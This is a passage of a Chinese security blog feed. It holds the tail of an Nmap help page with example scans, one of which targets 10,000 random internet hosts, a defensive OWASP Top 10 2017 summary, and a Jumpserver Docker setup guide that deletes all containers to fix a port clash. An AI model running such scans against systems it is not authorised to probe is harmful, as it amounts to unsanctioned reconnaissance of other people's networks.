–webxml：来自Nmap.Org的参考样式表，用于更多可移植的XML</p><p>  –no-stylesheet：防止与XML输出相关联的XSL样式表</p><p>MISC：</p><p>  -6：启用IPv6扫描</p><p>  -A：启用操作系统检测，版本检测，脚本扫描和跟踪路由</p><p>  –datadir <dirname>：指定自定义Nmap数据文件位置</dirname></p><p>  –send-eth /  -  send-ip：使用原始以太网帧或IP数据包发送</p><p>  –privileged：假设用户具有完全特权</p><p>  –unprivileged：假设用户缺少原始套接字权限</p><p>  -V：打印版本号</p><p>  -h：打印此帮助摘要页面。</p><p>例子：</p><p>  nmap -v -A scanme.nmap.org</p><p>  nmap -v -sn 192.168.0.0/16 10.0.0.0/8</p><p>  nmap -v -iR 10000 -Pn -p 80</p>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
    
    </summary>
    
      <category term="安全工具" scheme="http://yoursite.com/categories/%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7/"/>
    
    
      <category term="安全工具" scheme="http://yoursite.com/tags/%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7/"/>
    
  </entry>
  
  <entry>
    <title>OWASP TOP 10</title>
    <link href="http://yoursite.com/2018/08/13/OWASP10/"/>
    <id>http://yoursite.com/2018/08/13/OWASP10/</id>
    <published>2018-08-13T12:24:05.000Z</published>
    <updated>2018-08-14T01:14:25.851Z</updated>
    
    <content type="html"><![CDATA[<hr><a id="more"></a><p>繁华一场梦<br><img src="\images\pasted-56.png" alt="upload successful"></p><h1 id="什么是应用程序安全风险？"><a href="#什么是应用程序安全风险？" class="headerlink" title="什么是应用程序安全风险？"></a>什么是应用程序安全风险？</h1><p>攻击者可以通过应用程序中许多不同的路径方法去危害您的业务或者企业组织</p><p><img src="\images\pasted-55.png" alt="upload successful"></p><h1 id="A1注入"><a href="#A1注入" class="headerlink" title="A1注入"></a>A1注入</h1><h4 id="威胁来源"><a href="#威胁来源" class="headerlink" title="威胁来源"></a>威胁来源</h4><p>几乎任何数据源都能成为注入载体，包括环境变量、所有类型的用户、参数、外部和内部Web服务。当攻击者可以向解释器发送恶意数据时，注入漏洞产生</p><h4 id="安全弱点"><a href="#安全弱点" class="headerlink" title="安全弱点"></a>安全弱点</h4><p>注入漏洞十分普遍，尤其是在遗留代码中。注入漏洞通常能在SQL、 LDAP、 XPath或是NoSQL查询语句、 OS命令、 XML解析器、 SMTP包头、表达式语句及ORM查询语句中找到。</p><h4 id="影响"><a href="#影响" class="headerlink" title="影响"></a>影响</h4><p>注入能导致数据丢失、破坏或泄露给无授权方，缺乏可审计性或是拒绝服务。注入有时甚至能导致主机被完全接管</p><h4 id="应用程序的脆弱性"><a href="#应用程序的脆弱性" class="headerlink" title="应用程序的脆弱性"></a>应用程序的脆弱性</h4><p>当您的应用在如下时点时，是脆弱的并易受到攻击：</p><p>• 用户提供的数据没有经过应用程序的验证、过滤或净化。</p><p>• 动态查询语句或非参数化的调用，在没有上下文感知转义的情况下，被用于解释器。</p><p>• 在ORM搜索参数中使用了恶意数据，这样搜索就获得包含敏感或未授权的数据。</p><p>• 恶意数据直接被使用或连接，诸如SQL语句或命令在动态查询语<br>句、命令或存储过程中包含结构和恶意数据。</p><h4 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h4><p>防止注入漏洞需要将数据与命令语句、查询语句分隔开来。<br>• 最佳选择是使用安全的API，完全避免使用解释器，或提供参数化界面的接口，或迁移到ORM或实体框架。</p><p>• 注意： 当参数化时，存储过程仍然可以引入SQL注入，如果PL/SQL或T-SQL将查询和数据连接在一起，或者执行带有立即执行或exec()的恶意数据。</p><p>• 使用正确的或“白名单”的具有恰当规范化的输入验证方法同样会有助于防止注入攻击，但这不是一个完整的防御，因为许多应用程序在输入中需要特殊字符，例如文本区域或移动应用程序的API。</p><p>• 对于任何剩余的动态查询，可以使用该解释器的特定转义语法转义特殊字符。 OWASP的Java Encoder和类似的库提供了这样的转义例程</p><h1 id="A2失效的身份认证"><a href="#A2失效的身份认证" class="headerlink" title="A2失效的身份认证"></a>A2失效的身份认证</h1><h4 id="威胁来源-1"><a href="#威胁来源-1" class="headerlink" title="威胁来源"></a>威胁来源</h4><p>攻击者可以获得数百万的有效用户名和密码组合，包括证书填充、默认的管理帐户列表、自动的暴力破解和字典攻击工具，以及高级的GPU破解工具</p><h4 id="安全弱点-1"><a href="#安全弱点-1" class="headerlink" title="安全弱点"></a>安全弱点</h4><p>大多数身份和访问管理系统的设计和实现，普遍存在身份认证失效问题。会话管理是身份验证和访问控制的基础，并且存在于所有有状态应用程序中。攻击者可以使用指南手册来检测失效的身份验证，但通常会关注密码转储、字典攻击，或者在类似于钓鱼或社会工程攻击之后，发现失效的身份认证。</p><h4 id="影响-1"><a href="#影响-1" class="headerlink" title="影响"></a>影响</h4><p>攻击者只需要访问几个帐户，或者只需要一个管理员帐户就可以破坏我们的系统。根据应用程序领域的不同，可能会导致放任洗钱、社会安全欺诈以及用户身份盗窃、泄露法律高度保护的敏感信息。</p><h4 id="应用程序脆弱性"><a href="#应用程序脆弱性" class="headerlink" title="应用程序脆弱性"></a>应用程序脆弱性</h4><p>如果您的应用程序存在如下问题，那么可能存在身份验证的脆弱性：<br>• 允许凭证填充，这使得攻击者获得有效用户名和密码的列表。</p><p>• 允许暴力破解或其他自动攻击。</p><p>• 允许默认的、弱的或众所周知的密码，例如“Password1”或“admin/admin” 。</p><p>• 使用弱的或失效的验证凭证，忘记密码程序，例如“基于知识的答案”，这是不安全的。</p><p>• 使用明文、加密或弱散列密码（参见： A3:2017-敏感数据泄露）。</p><p>• 缺少或失效的多因素身份验证。</p><p>• 暴露URL中的会话ID（例如URL重写）。</p><p>• 在成功登录后不会更新会话ID。</p><p>• 不正确地使会话ID失效。当用户不活跃的时候，用户会话或认证令牌（特别是单点登录（SSO）令牌）没有正确注销或失效</p><h4 id="防御-1"><a href="#防御-1" class="headerlink" title="防御"></a>防御</h4><p>• 在可能的情况下，实现多因素身份验证，以防止自动、凭证填充、暴力破解和被盗凭据再利用攻击。</p><p>• 不要使用发送或部署默认的凭证，特别是管理员用户。</p><p>• 执行弱密码检查，例如测试新或变更的密码，以纠正“排名前10000个弱密码” 列表。</p><p>• 将密码长度、复杂性和循环策略与NIST-800-63 B的指导方针的5.1.1章节-记住秘密，或其他现代的基于证据的密码策略相一致。</p><p>• 确认注册、凭据恢复和API路径，通过对所有输出结果使用相同的消息，用以抵御账户枚举攻击。</p><p>• 限制或逐渐延迟失败的登录尝试。记录所有失败信息并在凭据填充、暴力破解或其他攻击被检测时提醒管理员。</p><p>• 使用服务器端安全的内置会话管理器，在登录后生成高度复杂的新随机会话ID。会话ID不能在URL中，可以安全地存储和当登出、闲置、绝对超时后使其失效。</p><h1 id="A3敏感信息泄露"><a href="#A3敏感信息泄露" class="headerlink" title="A3敏感信息泄露"></a>A3敏感信息泄露</h1><h4 id="威胁来源-2"><a href="#威胁来源-2" class="headerlink" title="威胁来源"></a>威胁来源</h4><p>攻击者不是直接攻击密码，而是在传输过程中或从客户端（例如：浏览器）窃取密钥、发起中间人攻击，或从服<br>务器端窃取明文数据。这通常需要手动攻击。通过使用图形处理单元（GPU），早前检索的密码数据库可能被暴力破解。</p><h4 id="安全弱点-2"><a href="#安全弱点-2" class="headerlink" title="安全弱点"></a>安全弱点</h4><p>这是最常见的、最具影响力的攻击。 这个领域最常见的漏洞是不对敏感信息进行加密。在数据加密过程中，常见的问题是不安全的密钥生成和管理以及使用弱加密算法、弱协议和弱密码。特别是使用弱的哈希算法来保护密码。在服务器端，检测传输过程中的数据弱点很容易， 但检测存储数据的弱点却非常困难。</p><h4 id="应用程序的脆弱性-1"><a href="#应用程序的脆弱性-1" class="headerlink" title="应用程序的脆弱性"></a>应用程序的脆弱性</h4><p>首先你需要确认的是哪些数据是敏感数据（包含：传输过程中的数据、存储数据）而需要被加密。例如：密码、信用卡卡号、医疗记录、个人信息应该被加密，特别是隐私法律或条例中规定需要加密的数据</p><p>对于这些数据，要确定：<br>• 在数据传输过程中是否使用明文传输？外部网络流量非常危险。验证所有的内部通信，如：负载平衡器、 Web服务器或后端系统之间的通信。</p><p>• 当数据被长期存储时，无论存储在哪里，它们是否都被加密，包含备份数据？</p><p>• 无论默认条件还是源代码中，是否还在使用任何旧的或脆弱的加密算法？</p><p>• 是否使用默认加密密钥，生成或重复使用脆弱的加密密钥，或者缺少恰当的密钥管理或密钥回转？</p><p>• 是否强制加密敏感数据，例如：用户代理（如：浏览器）指令和传输协议是否被加密？</p><h4 id="防御-2"><a href="#防御-2" class="headerlink" title="防御"></a>防御</h4><p>•对系统处理、存储或传输的数据分类，并根据分类进行访问控制。</p><p> • 熟悉与敏感数据保护相关的法律和条例，并根据每项法规要求保 护敏感数据。 </p><p>• 对于没必要存放的、重要的敏感数据，应当尽快清除。未存储的数据不能被窃取。 </p><p>• 确保存储的所有敏感数据被加密。</p><p> • 确保使用了最新的、强大的标准算法或密码、参数、协议和密匙， 并且密钥管理到位。 </p><p>• 确保传输过程中的数据被加密，如：使用TLS。 确保数据加密被 强制执行，如：使用HTTP严格安全传输（HSTS ）。</p><p> • 禁止缓存对包含敏感数据的响应。 </p><p>• 确保使用密码专用算法存储密码    </p><h1 id="A4XML外部实体"><a href="#A4XML外部实体" class="headerlink" title="A4XML外部实体"></a>A4XML外部实体</h1><h4 id="威胁来源-3"><a href="#威胁来源-3" class="headerlink" title="威胁来源"></a>威胁来源</h4><p>攻击者可以上传XML文档或者在XML文档中添加恶意内容，通过易受攻击的代码、依赖项或集成，他们就能够攻击含有缺陷的XML处理器。</p><h4 id="安全弱点-3"><a href="#安全弱点-3" class="headerlink" title="安全弱点"></a>安全弱点</h4><p>默认情况下，许多旧的XML处理器能够对外部实体、XML进程中被引用和评估的URI进行规范。XXE漏洞测试在2017年并不常见，因此手动测试人员需要通过接受培训来了解如何进行XXE漏洞测试。</p><h4 id="影响-2"><a href="#影响-2" class="headerlink" title="影响"></a>影响</h4><p>XXE缺陷可用于提取数据、执行远程服务器请求、扫描内部系统、执行拒绝服务攻击和其他攻击。</p><h4 id="应用程序的脆弱性-2"><a href="#应用程序的脆弱性-2" class="headerlink" title="应用程序的脆弱性"></a>应用程序的脆弱性</h4><p>应用程序和特别是基于XML的Web服务或向下集成，可能在以下方面容易受到攻击：<br>• 您的应用程序直接接受XML文件或者接受XML文件上传，特别是来自不受信任源的文件，或者将不受信任的数据插入XML文件，并提交给XML处理器解析。<br>• 在应用程序或基于Web服务的SOAP中，所有XML处理器都启用了文档类型定义（DTDs） </p><p>• 如果为了实现安全性或单点登录（SSO），您的应用程序使用SAML进行身份认证。而SAML使用XML进行身份确认，那么您的应用程序就容易受到XXE攻击</p><p>• 如果您的应用程序使用第1.2版之前的SOAP，并将XML实体传递到SOAP框架，那么它可能受到XXE攻击。</p><p>• 存在XXE缺陷的应用程序更容易受到拒绝服务攻击</p><h4 id="防御-3"><a href="#防御-3" class="headerlink" title="防御"></a>防御</h4><p>•尽可能使用简单的数据格式（如： JSON），避免对敏感数据进行序列化。</p><p>• 及时修复或更新应用程序或底层操作系统使用的所有XML处理器和库。将SOAP更新到1.2版本或更高版本</p><p>• 在应用程序的所有XML解析器中禁用XML外部实体和DTD进程。</p><p>• 在服务器端实施积极的（“白名单”）输入验证、过滤和清理</p><p>• 验证XML或XSL文件上传功能是否使用XSD验证或其他类似验证方法来验证上传的XML文件。</p><p>• SAST 工具可以检测源代码中的XXE漏洞</p><h1 id="A5失效的访问控制"><a href="#A5失效的访问控制" class="headerlink" title="A5失效的访问控制"></a>A5失效的访问控制</h1><h4 id="威胁来源-4"><a href="#威胁来源-4" class="headerlink" title="威胁来源"></a>威胁来源</h4><p>对访问控制的利用是渗透测试人员的一项核心技能。 SAST 工具和 DAST工具可以检测到访问控制的缺失，但不能验证其功能是否正常。访问控制可通过手动方式检测，或在某些特定框架下通过自动化检测访问控制缺失</p><h4 id="安全弱点-4"><a href="#安全弱点-4" class="headerlink" title="安全弱点"></a>安全弱点</h4><p>由于缺乏自动化的检测和应用程序开发人员缺乏有效的功能测试，因而访问控制缺陷很常见。</p><h4 id="影响-3"><a href="#影响-3" class="headerlink" title="影响"></a>影响</h4><p>技术影响是攻击者可以冒充用户、管理员或拥有特权的用户，或者创建、访问、更新或删除任何记录。业务影响取决于应用程序和数据的保护需求。</p><h4 id="应用程序的脆弱性-3"><a href="#应用程序的脆弱性-3" class="headerlink" title="应用程序的脆弱性"></a>应用程序的脆弱性</h4><p>常见的访问控制脆弱点包括：<br>• 通过修改 URL、内部应用程序状态或 HTML 页面绕过访问控制检查，或简单地使用自定义的 API 攻击工具</p><p>• 允许将主键更改为其他用户的记录，例如查看或编辑他人的帐户。</p><p>• 特权提升。在不登录的情况下假扮用户，或以用户身份登录时充当管理员。</p><p>• 元数据操作，如重放或篡改 JWT 访问控制令牌，或作以提升权限的cookie 或隐藏字段。</p><p>• CORS配置错误允许未授权的API访问。</p><p>• 以未通过身份验证的用户身份强制浏览的通过身份验证时才能看到的页面</p><h4 id="防御-4"><a href="#防御-4" class="headerlink" title="防御"></a>防御</h4><p>访问控制只有在受信服务器端代码或没有服务器的 API 中有效，这样这样攻击者才无法修改访问控制检查或元数据。<br>• 除公有资源外，默认情况下拒绝访问。</p><p>• 使用一次性的访问控制机制</p><p>• 建立访问控制模型以强制执行所有权记录，而不是接受用户创建、读取、更新或删除的任何记录。</p><p>• 域访问控制对每个应用程序都是唯一的，但业务限制要求应由域模型强制执行。</p><p>• 禁用 Web服务器目录列表，并确保文件元数据（如： git）不存在于 Web的根目录中。</p><p>• 记录失败的访问控制，并在适当时向管理员告警（如：重复故障）。</p><p>• 对API和控制器的访问进行速率限制，以最大限度地降低自动化攻击工具的危害。</p><p>• 当用户注销后，服务器上的JWT令牌应失效。</p><h1 id="A6安全配置错误"><a href="#A6安全配置错误" class="headerlink" title="A6安全配置错误"></a>A6安全配置错误</h1><h4 id="威胁来源-5"><a href="#威胁来源-5" class="headerlink" title="威胁来源"></a>威胁来源</h4><p>攻击者能够通过未修复的漏洞、访问默认账户、不再使用的页面、未受保护的文件和目录等来取得对系统的未授权的访问或了解。</p><h4 id="安全弱点-5"><a href="#安全弱点-5" class="headerlink" title="安全弱点"></a>安全弱点</h4><p>安全配置错误可以发生在一个应用程序堆栈的任何层面</p><h4 id="影响-4"><a href="#影响-4" class="headerlink" title="影响"></a>影响</h4><p>这些漏洞使攻击者能经常访问一些未授权的系统数据或功能。有时，这些漏洞导致系统的完全攻破。业务影响取决于您的应用程序和数据的保护需求。</p><h4 id="应用程序的脆弱性-4"><a href="#应用程序的脆弱性-4" class="headerlink" title="应用程序的脆弱性"></a>应用程序的脆弱性</h4><p>您的应用程序可能受到攻击，如果应用程序是：<br>• 应用程序栈堆的任何部分都缺少适当的安全加固，或者云服务的权限配置错误。</p><p>• 应用程序启用或安装了不必要的功能（例如：不必要的端口、服务、网页、帐户或权限）。</p><p>• 默认帐户的密码仍然可用且没有更改。</p><p>• 错误处理机制向用户披露堆栈跟踪或其他大量错误信息。</p><p>• 对于更新的系统，禁用或不安全地配置最新的安全功能。</p><p>• 应用程序服务器、应用程序框架（如： Struts、 Spring、ASP.NET）、库文件、数据库等没有进行安全配置。</p><p>• 服务器不发送安全标头或指令，或者未对服务器进行安全配置。</p><p>• 您的应用软件已过期或易受攻击（参见A9： 2017-使用含有已知漏洞的组件）。</p><h4 id="防御-5"><a href="#防御-5" class="headerlink" title="防御"></a>防御</h4><p>应实施安全的安装过程，包括：<br>• 一个可以快速且易于部署在另一个锁定环境的可重复的加固过程。开发、质量保证和生产环境都应该进行相同配置，并且，在每个环境中使用不同的密码。</p><p>• 搭建最小化平台，移除或不安装不适用的功能和框架。</p><p>• 检查和修复安全配置项来适应最新的安全说明、更新和补丁，并将其作为更新管理过程的一部分</p><p>• 一个能在组件和用户间提供有效的分离和安全性的分段应用程序架构，包括：分段、容器化和云安全组。</p><p>• 向客户端发送安全指令，如： 安全标头。</p><p>• 在所有环境中能够进行正确安全配置和设置的自动化过程。</p><h1 id="A7跨站脚本XSS"><a href="#A7跨站脚本XSS" class="headerlink" title="A7跨站脚本XSS"></a>A7跨站脚本XSS</h1><h4 id="威胁来源-6"><a href="#威胁来源-6" class="headerlink" title="威胁来源"></a>威胁来源</h4><p>自动化工具能够检测并利用所有的三种XSS形式，并且存在方便攻击者利用漏洞的框架。</p><h4 id="安全弱点-6"><a href="#安全弱点-6" class="headerlink" title="安全弱点"></a>安全弱点</h4><p>XSS是OWASP Top10中第二普遍的安全问题，存在于近三分之二的应用中。自动化工具能自动发现一些XSS问题，特别是在一些成熟的技术中，如： PHP、 J2EE或JSP、 ASP.NET。</p><h4 id="影响-5"><a href="#影响-5" class="headerlink" title="影响"></a>影响</h4><p>XSS对于反射和DOM的影响是中等的，而对于存储的XSS， XSS的影响更为严重，譬如在受攻击者的<br>浏览器上执行远程代码，例如：窃取凭证和会话或传递恶意软件等。</p><h4 id="应用程序的脆弱性-5"><a href="#应用程序的脆弱性-5" class="headerlink" title="应用程序的脆弱性"></a>应用程序的脆弱性</h4><p>存在三种XSS类型，通常针对用户的浏览器：<br>反射式XSS： 应用程序或API包括未经验证和未经转义的用户输入，作为HTML输出的一部分。</p><p>存储式XSS： 你的应用或者API将未净化的用户输入存储下来了，并在后期在其他用户或者管理员的页面展示出来。 存储型XSS一般被认为是高危或严重的风险。</p><p>基于DOM的XSS： 会动态的将攻击者可控的内容加入页面的JavaScript框架、单页面程序或API存在这种类型的漏洞</p><p>典型的XSS攻击可导致盗取session、账户、绕过MFA、 DIV替换、对用户浏览器的攻击（例如：恶意软件下载、键盘记录）以及其他用户的攻击。</p><h4 id="防御-6"><a href="#防御-6" class="headerlink" title="防御"></a>防御</h4><p>防止XSS需要将不可信数据与动态的浏览器内容区分开。 这可以通过如下步骤实现：</p><p>• 使用设计上就会自动编码来解决XSS问题的框架，如： Ruby 3.0</p><p>• 为了避免反射式或存储式的XSS漏洞，最好的办法是根据HTML输出的上下文（包括：主体、属性、 JavaScript、 CSS或URL）对所有不可信的HTTP请求数据进行恰当的转义 。 </p><p>• 在客户端修改浏览器文档时，为了避免DOM XSS攻击，最好的选择是实施上下文敏感数据编码。 </p><p>• 使用内容安全策略（CSP） 是对抗XSS的深度防御策略。</p><h1 id="A8不安全的反序列化"><a href="#A8不安全的反序列化" class="headerlink" title="A8不安全的反序列化"></a>A8不安全的反序列化</h1><h4 id="威胁来源-7"><a href="#威胁来源-7" class="headerlink" title="威胁来源"></a>威胁来源</h4><p>对反序列化的利用是有点困难的。因为在不更改或调整底层可被利用代码的情况下，现成的反序列化漏洞很难<br>被使用。</p><h4 id="安全弱点-7"><a href="#安全弱点-7" class="headerlink" title="安全弱点"></a>安全弱点</h4><p>有些工具可以被用于发现反序列化缺陷，但经常需要人工帮助来验证发现的问题。</p><h4 id="影响-6"><a href="#影响-6" class="headerlink" title="影响"></a>影响</h4><p>反序列化缺陷的影响不能被低估。它们可能导致远程代码执行攻击，这是可能发生的最严重的攻击之一。</p><h4 id="应用程序的脆弱性-6"><a href="#应用程序的脆弱性-6" class="headerlink" title="应用程序的脆弱性"></a>应用程序的脆弱性</h4><p>如果反序列化进攻者提供的敌意或者篡改过的对象将会使将应用程序和API变的脆弱。<br>这可能导致两种主要类型的攻击：<br>• 如果应用中存在可以在反序列化过程中或者之后被改变行为的类，则攻击者可以通过改变应用逻辑或者实现远程代码执行攻击。</p><p>• 典型的数据篡改攻击，如访问控制相关的攻击，其中使用了现有的数据结构，但内容发生了变化。</p><h4 id="防御-7"><a href="#防御-7" class="headerlink" title="防御"></a>防御</h4><p>唯一安全的架构模式是不接受来自不受信源的序列化对象，或使用只允许原始数据类型的序列化媒体。<br>如果上述不可能的话，考虑使用下述方法：</p><p>• 执行完整性检查，如：任何序列化对象的数字签名，以防止恶意对象创建或数据篡改。</p><p>• 在创建对象之前强制执行严格的类型约束，因为代码通常被期望成一组可定义的类。绕过这种技术的方法已经被证明，所以完全依赖于它是不可取的。</p><p>• 如果可能，隔离运行那些在低特权环境中反序列化的代码。</p><p>• 记录反序列化的例外情况和失败信息</p><p>• 限制或监视来自于容器或服务器传入和传出的反序列化网络连接。</p><h1 id="A9使用含有已知漏洞的组件"><a href="#A9使用含有已知漏洞的组件" class="headerlink" title="A9使用含有已知漏洞的组件"></a>A9使用含有已知漏洞的组件</h1><h4 id="威胁来源-8"><a href="#威胁来源-8" class="headerlink" title="威胁来源"></a>威胁来源</h4><p>对一些漏洞很容易找到其利用程序</p><h4 id="安全弱点-8"><a href="#安全弱点-8" class="headerlink" title="安全弱点"></a>安全弱点</h4><p>这种安全漏洞普遍存在。基于组件开发的模式使得多数开发团队根本不了解其应用或API中使用的组件，更谈不上及时更新这些组件了。</p><h4 id="影响-7"><a href="#影响-7" class="headerlink" title="影响"></a>影响</h4><p>虽然对于一些已知的漏洞其影响很小，但目前很多严重的安全事件都是利用组件中的已知漏洞。根据你所要保护的资产，此类风险等级可能会很高。</p><h4 id="应用程序的脆弱性-7"><a href="#应用程序的脆弱性-7" class="headerlink" title="应用程序的脆弱性"></a>应用程序的脆弱性</h4><p>如果满足下面的某个条件，那么你的应用就易受此类攻击：<br>• 如果你不知道所有使用的组件版本信息</p><p>• 如果软件易受攻击，不再支持或者过时。这包括： OS、 Web服务器、应用程序服务器、数据库管理系统（DBMS）、应用程序、API和所有的组件、运行环境和库。</p><p>• 如果你不会定期做漏洞扫描和订阅你使用组件的安全公告。</p><p>• 如果你不基于风险并及时修复或升级底层平台、框架和依赖库。</p><p>• 如果软件工程师没有对更新的、升级的或打过补丁的组件进行兼容性测试。</p><p>• 如果你没有对组件进行安全配置</p><h4 id="防御-8"><a href="#防御-8" class="headerlink" title="防御"></a>防御</h4><p>应该制定一个补丁管理流程：<br>• 移除不使用的依赖、不需要的功能、组件、文件和文档。</p><p>• 利用如 versions、 DependencyCheck 、 retire.js等工具来持续的记录客户端和服务器端以及它们的依赖库的版本信息，订阅关于使用组件安全漏洞的警告邮件。</p><p>• 仅从官方渠道安全的获取组件，并使用签名机制来降低组件被篡改或加入恶意漏洞的风险</p><p>• 监控那些不再维护或者不发布安全补丁的库和组件。</p><h1 id="A10不足的日志记录和监控"><a href="#A10不足的日志记录和监控" class="headerlink" title="A10不足的日志记录和监控"></a>A10不足的日志记录和监控</h1><h4 id="威胁来源-9"><a href="#威胁来源-9" class="headerlink" title="威胁来源"></a>威胁来源</h4><p>攻击者依靠监控的不足和响应的不及时来达成他们的目标而不被知晓。</p><h4 id="安全弱点-9"><a href="#安全弱点-9" class="headerlink" title="安全弱点"></a>安全弱点</h4><p>判断你是否有足够监控的一个策略是在渗透测试后检查日志。 测试者的活动应被充分的记录下来，能够反映出他们造成了什么样的影响。</p><h4 id="影响-8"><a href="#影响-8" class="headerlink" title="影响"></a>影响</h4><p>多数成功的攻击往往从漏洞探测开始。允许这种探测会将攻击成功的可能性提高到近100%</p><h4 id="应用程序的脆弱性-8"><a href="#应用程序的脆弱性-8" class="headerlink" title="应用程序的脆弱性"></a>应用程序的脆弱性</h4><p> 下列情况会导致不足的日志记录、检测、监控和响应：<br>• 未记录可审计性事件，如：登录、登录失败和高额交易。</p><p>• 告警和错误事件未能产生或产生不足的和不清晰的日志信息。</p><p>• 没有利用应用系统和API的日志信息来监控可疑活动。</p><p>• 日志信息仅在本地存储。</p><p>• 没有定义合理的告警阈值和制定响应处理流程。</p><p>• 渗透测试和使用DAST工具（如： OWASP ZAP）扫描没有触发告警</p><p>• 对于实时或准实时的攻击，应用程序无法检测、处理和告警</p><h4 id="防御-9"><a href="#防御-9" class="headerlink" title="防御"></a>防御</h4><p>根据应用程序存储或处理的数据的风险：<br>• 确保所有登录、访问控制失败、输入验证失败能够被记录到日志中去，并保留足够的用户上下文信息，以识别可疑或恶意帐户，并为后期取证预留足够时间。</p><p>• 确保日志以一种能被集中日志管理解决方案使用的形式生成</p><p>• 确保高额交易有完整性控制的审计信息，以防止篡改或删除</p><p>• 建立有效的监控和告警机制，使可疑活动在可接受的时间内被发现和应对。</p><p>• 建立或采取一个应急响应机制和恢复计划</p>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
    
    </summary>
    
      <category term="读书笔记" scheme="http://yoursite.com/categories/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="读书笔记" scheme="http://yoursite.com/tags/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>Jumpserver堡垒机</title>
    <link href="http://yoursite.com/2018/08/13/Jumpserver%E5%A0%A1%E5%9E%92%E6%9C%BA/"/>
    <id>http://yoursite.com/2018/08/13/Jumpserver堡垒机/</id>
    <published>2018-08-13T08:48:02.000Z</published>
    <updated>2018-08-13T15:06:25.714Z</updated>
    
    <content type="html"><![CDATA[<hr><a id="more"></a><p>繁华一场梦</p><p>我们采用的是docker的安装方式：</p><p>官方文档位置：<a href="https://jumpserver.readthedocs.io/zh/docs/dockerinstall.html" target="_blank" rel="noopener">https://jumpserver.readthedocs.io/zh/docs/dockerinstall.html</a></p><h2 id="环境："><a href="#环境：" class="headerlink" title="环境："></a>环境：</h2><p>centos7    Jumpserver    docker</p><h2 id="1-在centos安装docker，已经安装的可以跳过这一步"><a href="#1-在centos安装docker，已经安装的可以跳过这一步" class="headerlink" title="1.在centos安装docker，已经安装的可以跳过这一步"></a>1.在centos安装docker，已经安装的可以跳过这一步</h2><h4 id="系统要求"><a href="#系统要求" class="headerlink" title="系统要求"></a>系统要求</h4><p>64位，内核版本不低于3.10，推荐使用CentOS 7系统</p><p><code>uname -r</code>     #查看内核版本信息</p><h4 id="安装并启动Docker"><a href="#安装并启动Docker" class="headerlink" title="安装并启动Docker"></a>安装并启动Docker</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">yum   update  -y    #更新依赖</span><br><span class="line">yum   -y  install   docker</span><br><span class="line">systemctl   start   docker</span><br></pre></td></tr></table></figure><h4 id="验证安装"><a href="#验证安装" class="headerlink" title="验证安装"></a>验证安装</h4><p><code>docker version</code></p><p><img src="\images\pasted-49.png" alt="upload successful"></p><h4 id="配置Docker"><a href="#配置Docker" class="headerlink" title="配置Docker"></a>配置Docker</h4><p>设置镜像</p><p><code>vim /etc/docker/daemon.json</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">  &quot;registry-mirrors&quot;: [&quot;https://aj2rgad5.mirror.aliyuncs.com&quot;]</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>重启Docker<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">systemctl daemon-reload</span><br><span class="line">systemctl restart docker.service</span><br></pre></td></tr></table></figure></p><p>\2. 用Jumpserver的源</p><p>快速启动</p><p>使用 root 命令行输入:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -d -p 8080:80 -p 2222:2222 registry.jumpserver.org/public/jumpserver:1.0.0</span><br></pre></td></tr></table></figure></p><p><img src="\images\pasted-50.png" alt="upload successful"></p><p>这个过程有点漫长，可以挂个代理加速下载，centos7下挂代理的方法详情见下面链接：</p><p><a href="https://jingyan.baidu.com/article/148a1921f5c5fe4d71c3b105.html" target="_blank" rel="noopener">https://jingyan.baidu.com/article/148a1921f5c5fe4d71c3b105.html</a></p><p>下载好了以后我们看下docker仓库里的镜像有没有Jumpserver</p><p><code>docker  images</code></p><p><img src="\images\pasted-51.png" alt="upload successful"></p><p>我们在docker下启动jumpserver：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -d -p 8080:80 -p 2222:2222 -e DB_ENGINE=mysql -e DB_HOST=192.168.1.1 -e DB_PORT=3306 -e DB_USER=root -e DB_PASSWORD=xxx -e DB_NAME=jumpserver  registry.jumpserver.org/public/jumpserver:1.0.0</span><br></pre></td></tr></table></figure></p><p>在这里我们遇到了一个问题：</p><p><img src="\images\pasted-52.png" alt="upload successful"></p><p>这里提示我们端口被占用了</p><p>解决方法如下：</p><p>查看进程，发现相关的容器并没有在运行，而 docker-proxy 却依然绑定着端口</p><p>docker  ps</p><p>ps -aux | grep -v grep | grep docker-proxy</p><p>停止 doker 进程，删除所有容器，然后删除 local-kv.db 这个文件，再启动 docker 就可以了。</p><p>sudo service docker stop</p><p>docker rm $(docker ps -aq)</p><p>sudo rm /var/lib/docker/network/files/local-kv.db</p><p># sudo service docker start</p><p>成功启动起来</p><p>访问</p><p>浏览器访问: <a href="http:/" target="_blank" rel="noopener">http:/</a>/&lt;容器所在服务器IP&gt;:8080</p><p>SSH访问: ssh -p 2222 &lt;容器所在服务器IP&gt;</p><p>XShell等工具请添加connection连接</p><p>我们采用第一种方式访问看看</p><p><img src="\images\pasted-53.png" alt="upload successful"></p><p>默认</p><p>用户名：admin</p><p>密码：   admin</p><p><img src="\images\pasted-54.png" alt="upload successful"></p><p>如果要采用编译安装方式参考下面的文档：</p><p><a href="https://www.cnblogs.com/along21/p/8795907.html" target="_blank" rel="noopener">https://www.cnblogs.com/along21/p/8795907.html</a></p><p>设置详情见入门文档</p><p><a href="https://jumpserver.readthedocs.io/zh/docs/admin_create_asset.html" target="_blank" 